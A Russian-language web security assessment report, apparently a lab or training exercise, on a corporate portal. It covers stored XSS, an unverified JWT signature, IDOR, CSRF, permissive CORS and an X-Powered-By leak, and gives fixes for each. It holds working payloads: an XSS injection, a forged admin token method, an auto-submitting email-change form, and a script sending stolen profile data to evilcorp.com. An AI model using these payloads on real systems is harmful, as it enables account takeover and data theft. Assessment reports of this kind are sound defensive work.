Список уязвимостей обнаруженных в ходе анализа защищённости веб-приложения корпоративного портала:
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
***Тип: Stored Cross‑Site Scripting (XSS) in display_name***

**Эксплуатация:**
1. Отправляем POST запрос с полезной нагрузкой внутри JSON объекта:
```HTTP
POST /api/v1/profile HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
Content-Type: application/json
Origin: https://portal.targetcorp.com
 
{"display_name": "<img src=x onerror=alert(document.domain)>", "bio": "Test user"}
```

2. Делаем запрос в профиль, чтобы убедиться, что нагрузка работает:
```HTTP
GET /profile/105 HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
```
Ответ:
```HTTP
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
 
<!DOCTYPE html>
<html>
<head><title>User Profile</title></head>
<body>
 <div class="profile-card">
   <h2><img src=x onerror=alert(document.domain)></h2>
   <p class="bio">Test user</p>
   <p class="uid">User ID: 105</p>
  </div>
</body>
</html>
```

**Риски:**
1. Session hijacking, если ссесионная кука не защищена флагом HttpOnly, из-за этого можно украть cookie через JS в браузере жертвы.
2. Account takeover, в нашем ничего кроме cookies не требуется для доступа к аккаунту, злоумышленник заходит в аккаунт жертвы, меняет пароль и доступ к аккаунту потерян.
3. CSRF, через fetch можно отправить запрос на изменение состояния (поменять email, пароль и тд), тк для валидации действия используются только сессионные cookies.
4. Phishing, распространение дезинформации на сайте и другие специфические риски связанные с компанией.

**Рекомендации по устранению:**
1. Использовать безопасный рендеринг в шаблонизаторах/DOMPurify для валидации значений.
2. Добавить Content Security Policy (CSP). Настроить заголовок, запрещающий выполнение инлайн скриптов и сделать ограничение на источники скриптов. Установить HttpOnly, чтобы нельзя было получить cookies через JS, затрудняя реализацию через CSRF.

***Тип: Weak JSON Web Token (JWT)***

**Эксплуатация:**
1. Декодируем JWT токен, чтобы извлечь header и payload.
Header:
```JSON
{
  "alg": "HS256"
}
```
Payload:
```JSON
{
  "uid": 105,
  "username": "attacker",
  "role": "user"
}
```
2. Сервер не проверяет подпись в токене (поскольку часть сигнатуры jwt не подходит под RFC-стандарты) и просто распаковывает header и payload. В противном случае должна быть ошибка от сервера при обработке токена, но её не было. Поэтому такие выводы
3. Заменяем поля в JWT токене: {"uid": 1, "username": "admin", "role": "admin"}. Кодируем обратно и получаем доступ к аккаунту жертвы.

**Риски:**
1. Account takeover. Ничего кроме токена не требуется для доступа к аккаунту - мы можем получить доступ к любому аккаунту на платформе.
2. Privilege escalation. Можно поменять role на любую доступную из ролевой модели сайта (в нашей ситуации admin)

**Рекомендации по устранению:**
1. Реализовать проверку подписи.
2. Качественный ключ. Использовать случайный и длинный ключ, чтобы его было невозможно перебрать.
3. Если возможно, заменить на асимметричный алгоритм шифрования, чтобы нельзя было подписать токен самостоятельно через брутфорс ключа.
4. Валидация алгоритма. Принимать только ожидаемый алгоритм, остальные отклонять.
5. Добавить время жизни токена, чтобы минимизировать период пребывания злоумышленника на аккаунте.

***Тип: Insecure Direct Object Reference (IDOR)***

**Эксплуатация:**
1. С любым валидным токеном обращаемся к uid 1, 2, 3 ... (uid других пользователей):
(тут обращаюсь от пользователя с uid 105)
```HTTP
GET /api/v1/profile/1 HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
```
Ответ: (получили информацию о пользователе с uid 1)
```HTTP
HTTP/1.1 200 OK
Content-Type: application/json
 
{"uid": 1, "username": "admin", "email": "admin@targetcorp.com",
 "role": "administrator", "display_name": "Admin User",
 "last_login": "2025-03-15T10:30:00Z"}
 ```
 2. Сервер обрабатывает запрос, предоставляя информацию о любом пользователе в системе.

**Риски:**
1. Раскрытие чувствительной информации о всех пользователях, утечка данных. (можно узнать о любом пользователе: uid, username, email, role, display_name, last_login)

**Рекомендации по устранению:**
1. Добавить проверку авторизации, имеет ли пользователь доступ к аккаунту с определенным uid.
2. Использовать неочевидные идентификаторы, чтобы усложнить перебор (можно использовать uuid)

***Тип: CSRF в endpoint /api/v1/account/change-email***

**Эксплуатация:**
1. Размещаем на своем домене скрипт:
```HTML
    <form id="csrf-email" action="https://portal.targetcorp.com/api/v1/account/change-email" method="POST">
        <input type="hidden" name="new_email" value="hacked@email.com">
    </form>
    <script>
        document.getElementById('csrf-email').submit();
    </script>
```
2. Аутентифицированная жертва посещает evilcorp.com, браузер отправляет запрос на /api/v1/account/change-email и автоматически прикрепляет cookies.

**Риски:**
1. Account takeover, злоумышленник может изменить email жертвы на свой, а затем инициировать сброс пароля (как мы видим в запросе 5) и доступ к аккаунту бужет потерян.

**Рекомендации по устранению:**
1. Использовать CSRF токен. Генерировать на серверной стороне уникальный токен и привязывать его к сессии любого пользователя, такой токен должен прикрепляться к любому запросу, который изменяет состояние.
2. Установить SameSite=Strict (Lax) или использовать json Content-Type (как на /api/v1/profile endpoint), чтобы запрос стал сложным. Первое не даст сессионным данным отправляться с произвольного сайта. Второе гарантирует PreFlight запрос, что при правильной настройке CORS, не даст отправить запрос с сторонней Origin.

***Тип: Insecure CORS Configuration***

**Эксплуатация:**
1. Отправляем запрос с заголовком Origin: https://evilcorp.com. Видим, что произвольный Origin отражается в ответе.
2. Размещаем на стороннем сайте скрипт для чтения учетных данных:
```JS
fetch('https://portal.targetcorp.com/api/v1/profile/1', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    fetch('https://evilcorp.com/collect?data=' + encodeURIComponent(JSON.stringify(data)));
});
```

**Риски:**
1. Любой API‑эндпоинт, возвращающий конфиденциальные данные (например, GET /api/v1/profile/1), доступен через fetch с credentials: 'include', можно украсть личные данные пользователей, включая email администратора, роль, время последнего входа и т. д.

**Рекомендации по устранению:**
1. Белый список для значений заголовков. Проверять заголовки Origin и Refer на сервере.

Дополнительные рекомендации:

***Тип: Information Disclosure через X-Powered-By***

**Эксплуатация:**
1. Отправить запрос на endpoint /profile/105:
```HTTP
GET /profile/105 HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
```

Ответ:
```HTTP
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
 
<!DOCTYPE html>
<html>
<head><title>User Profile</title></head>
<body>
 <div class="profile-card">
   <h2><img src=x onerror=alert(document.domain)></h2>
   <p class="bio">Test user</p>
   <p class="uid">User ID: 105</p>
  </div>
</body>
</html>
```

**Риски:**
1. Само по себе не уявляется уязвимостью, но дополнительная информация помогает атакующим лучше понять стек приложения. Зная версию/технологии можно найти специфические CVEs или мисконфигурации, что увеличивает площадь атаки.

**Рекомендации по устранению:**
1. Отключить header X-Powered-By: в продакшн версии приложения. А также любые другие headers, которые раскрывают дополнительную информацию о приложении.

***Что можно дополнительно протестировать?***
1. Попробовать добавить две почты в форму сброса пароля, возможно код отправится на два email
2. CSRF также можно осуществить через смену пароля, а не почты.
